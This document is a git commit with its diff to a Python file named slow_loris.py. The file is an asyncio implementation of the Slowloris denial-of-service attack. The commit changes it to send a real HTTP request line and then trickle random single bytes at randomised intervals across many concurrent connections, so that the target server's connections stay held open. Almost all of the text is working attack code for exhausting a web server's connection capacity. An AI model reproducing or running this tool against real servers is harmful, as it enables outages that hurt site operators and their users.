9177c13c2fd46b63d5dad6ff6f55e2b5ef6c501f
wpbindt <wesselbindt@gmail.com>
2021-04-30 17:54:39 +0200

    Send actual http header, fix imports

--- slow_loris.py
+++ slow_loris.py
@@ -4,22 +4,24 @@ from functools import partial
 import random
 from typing import Callable, Generator
 
-from .utils import retry
+from utils import retry
 
 
 async def headers(
-    random_sleep: Callable[[], float] = lambda: 1
+    random_sleep: Callable[[], float],
 ) -> Generator[bytes, None, None]:
-    yield 'TOP HEADER\r\n'.encode('ascii')
+    yield 'GET /ip HTTP/1.1\r\n'.encode('ascii')
     while True:
         await asyncio.sleep(random_sleep())
-        yield random.randbytes(8) + '\r\n'.encode('ascii')
+        yield random.randbytes(1) + '\r\n'.encode('ascii')
 
 
 @retry(on=ConnectionRefusedError, retries=3)
-async def slow_loris(address, random_sleep):
+async def slow_loris(address, random_sleep=lambda: 1.5):
+    print('Connected to server')
     _, server = await asyncio.open_connection(*address)
     async for header in headers(random_sleep):
+        print(f'Sending random byte {header}')
         server.write(header)
         await server.drain()
 
@@ -27,7 +29,7 @@ async def slow_loris(address, random_sleep):
 async def main(address, loris_count):
     lorises = [
         asyncio.create_task(
-            slow_loris(address, partial(random.gauss, mu=1, sigma=0.5))
+            slow_loris(address, partial(random.gauss, mu=5, sigma=0.5))
         )
         for _ in range(loris_count)
     ]
